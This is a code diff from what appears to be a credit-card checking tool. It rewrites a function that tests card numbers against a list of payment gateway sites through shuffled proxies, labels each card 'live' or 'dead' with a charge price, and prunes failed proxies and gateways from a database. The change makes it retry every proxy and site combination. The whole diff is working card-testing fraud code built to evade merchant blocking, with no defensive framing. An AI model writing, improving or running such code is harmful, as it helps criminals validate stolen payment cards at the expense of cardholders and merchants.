@@ -6297,34 +6297,35 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return result;
         };
 
-        // Check a single card with site/proxy rotation
-        const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
-          const shuffledProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
-          if (shuffledProxies.length === 0) return { status: 'unknown', response: 'No proxies', price: '$0.00' };
-          const maxSites = Math.min(5, mtxtAvailableSites.length);
-          for (let si = 0; si < maxSites; si++) {
-            const site = mtxtAvailableSites[si % mtxtAvailableSites.length];
-            for (const proxy of shuffledProxies) {
-              if (mtxtFailedProxyIds.includes(proxy.id)) continue;
-              const result = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
-              if (result.proxyDead) {
-                mtxtFailedProxyIds.push(proxy.id);
-                supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
-                continue;
-              }
-              if (result.siteDead) {
-                supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
-                break;
-              }
-              if (result.status === 'live' || result.status === 'dead') {
-                return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
-              }
-              // On unknown, try next site instead of returning immediately
-              break;
-            }
-          }
-          return { status: 'unknown', response: 'All attempts failed', price: '$0.00' };
-        };
+         // Check a single card with site/proxy rotation - try ALL combos before giving up
+         const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
+           const shuffledProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
+           if (shuffledProxies.length === 0) return { status: 'error', response: 'No proxies', price: '$0.00' };
+           const maxSites = Math.min(5, mtxtAvailableSites.length);
+           let lastResponse = 'All attempts failed';
+           for (let si = 0; si < maxSites; si++) {
+             const site = mtxtAvailableSites[si % mtxtAvailableSites.length];
+             for (const proxy of shuffledProxies) {
+               if (mtxtFailedProxyIds.includes(proxy.id)) continue;
+               const result = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
+               if (result.proxyDead) {
+                 mtxtFailedProxyIds.push(proxy.id);
+                 supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
+                 continue;
+               }
+               if (result.siteDead) {
+                 supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
+                 break; // skip to next site
+               }
+               if (result.status === 'live' || result.status === 'dead') {
+                 return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
+               }
+               // unknown - save response and try next proxy
+               lastResponse = result.response || result.message || 'Unknown';
+             }
+           }
+           return { status: 'error', response: lastResponse, price: '$0.00' };
+         };
 
         // Results array
         interface MtxtResult { cc: string; status: string; response: string; price: string; bank: string; flag: string; }
